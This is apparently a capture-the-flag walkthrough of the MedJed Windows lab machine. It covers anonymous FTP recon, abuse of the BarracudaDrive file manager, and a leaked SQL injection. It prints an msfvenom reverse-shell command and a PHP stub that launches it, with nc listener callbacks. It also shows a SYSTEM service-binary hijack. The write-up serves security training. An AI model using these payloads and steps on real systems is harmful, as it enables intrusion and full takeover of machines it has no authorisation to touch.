#Windows #WebDAV #FTP #BarracudaDrive #SQLi #msfvenom #ServiceHijack #CVE

## Overview

MedJed is a Windows machine that puts an overwhelming number of ports on the table, then rewards the attacker for working through them methodically. The path chains three distinct services: an anonymous FTP server exposing a Rails app's directory structure, a BarracudaDrive web file manager that gives access to the full filesystem, and a Ruby on Rails web app with a broken password reset that leaks the SQL query powering it. RCE comes from writing a PHP runner through the file manager into the XAMPP webroot. Privilege escalation abuses a known BarracudaDrive insecure folder permission (ExploitDB 48789) that lets any authenticated user replace the `bd.exe` service binary.

## Recon

### Nmap

```sh
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql        # MariaDB: external connections denied
8000/tcp  open  http-alt     BarracudaServer.com (Windows)
30021/tcp open  ftp          FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown      # Rails app (403 on GET → ActionController exception)
44330/tcp open  ssl/unknown
45332/tcp open  http         Apache httpd 2.4.46 (Win64) PHP/7.3.23 — Quiz App
45443/tcp open  http         Apache httpd 2.4.46 (Win64) PHP/7.3.23
```

The sheer number of ports is the first puzzle. Key observations: port 8000 identifies itself as BarracudaServer; port 30021 allows anonymous FTP; port 33033 throws a Rails exception page on GET, which leaks framework internals.

> **Why a crowded port list matters:** each service is a separate attack surface with its own trust boundary. The attacker's job is not to exploit everything, but to find which services can be chained. Here, FTP + BarracudaDrive file manager + XAMPP webroot form the winning chain.

### Anonymous FTP (port 30021)

FileZilla ftpd accepted anonymous login without a password and exposed what looked like the webroot of a Rails application:

```sh
ftp 192.168.206.127 30021
Name: Anonymous
230 Logged on

-r--r--r-- 1 ftp ftp   536  Nov 03 2020 .gitignore
drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 app
drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 config
-r--r--r-- 1 ftp ftp  1750  Nov 03 2020 Gemfile
drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 public
```

The structure confirmed a Ruby on Rails app was hosted somewhere. The FTP root also serves as a potential file-drop location for later use.

### Port 8000, BarracudaDrive File Manager

Navigating to the setup wizard created a local admin account:

```
http://192.168.206.127:8000/Config-Wizard/wizard/SetAdmin.lsp
```

Once authenticated, the web file manager at `/fs/` exposed the entire Windows filesystem with upload and download capability. Browsing to `C:\xampp\htdocs\` confirmed the XAMPP webroot, the place where files dropped here become web-accessible and executable as PHP.

### Port 33033, Rails App with SQLi Leak

The landing page listed company employees with names and email addresses, including:

```
Jerren Valon - jerren.devops@company.com
```

A password reset feature accepted a username with no verification. Resetting Jerren's password:

```
Username: jerren.devops
Reminder: paranoid
New Password: admin
```

After logging in, an "experimental" profile-slug field accepted SQL metacharacters. Entering a single quote exposed the raw query:

```sql
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
```

The injection was confirmed but not exploited further, because the file manager gave a more direct path to RCE.

## Foothold

### RCE via BarracudaDrive + XAMPP Webroot

The file manager could write to `C:\xampp\htdocs\`, the XAMPP webroot, served by Apache on port 45332. The plan: upload a reverse-shell exe, plant a PHP stub that executes it, then trigger the PHP file via the browser.

Payload generation:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=45332 -f exe > reverse.exe
```

PHP stub written into the webroot via the BarracudaDrive file manager (`/fs/C/xampp/htdocs/run.php`):

```php
<?php
$exec = system('C:/Users/Jerren/Desktop/reverse.exe', $val)
?>
```

The reverse.exe was uploaded to `C:\Users\Jerren\Desktop\` through the file manager as well.

Triggering the chain:

```
GET 192.168.206.127:45332/run.php
```

```sh
rlwrap nc -lvnp 45332
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.127] 50689

C:\xampp\htdocs>whoami
medjed\jerren
```

## Privilege Escalation

### BarracudaDrive bd.exe Service Hijack (ExploitDB 48789)

WinPEAS identified world-writable permissions on the BarracudaDrive service binary:

```
C:\bd\bd.exe
```

This matches ExploitDB 48789: **BarracudaDrive v6.5, Insecure Folder Permissions**. The service binary runs as `SYSTEM`, and its containing directory is writable by low-privilege users. Replacing the binary means the next service start executes attacker-controlled code as `SYSTEM`.

> **How insecure folder permissions become SYSTEM:** Windows service binaries are launched by the Service Control Manager under the account configured in the service definition, often `LocalSystem`. If the binary path sits in a directory where a non-admin user has write access, swapping the binary is equivalent to rewriting the service. No exploit needed; it's a misconfigured ACL.

The existing `bd.exe` was renamed rather than deleted (the `move` command worked where `del` had failed):

```powershell
move bd.exe bd.service.exe
```

The same reverse-shell exe was already on disk. After placing it as the new `bd.exe` and issuing a reboot:

```powershell
shutdown /r
```

## Root / SYSTEM

The listener was restarted immediately. As the machine came back up, the BarracudaDrive service started, executed the planted binary, and connected back:

```sh
rlwrap nc -lvnp 45332
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.127] 49668

C:\WINDOWS\system32>whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **Anonymous FTP leaking a webroot structure sets the recon agenda.** The Rails directory tree showed the app tech stack before a single HTTP request was made.
- **Web file managers that expose the full filesystem are essentially root.** BarracudaDrive's `/fs/` endpoint let an unprivileged user write PHP files into a live webroot, no need to exploit the file manager itself.
- **WinPEAS writable service binaries are immediate targets.** Any `SERVICE_START_NAME: LocalSystem` entry whose binary path sits in a user-writable directory is an instant SYSTEM if you can survive a reboot.
- **Password resets with no identity verification leak usernames and open lateral-move paths.** The Rails app's SQLi disclosure was a bonus, the real win was the unauthenticated password reset handing over a valid session.
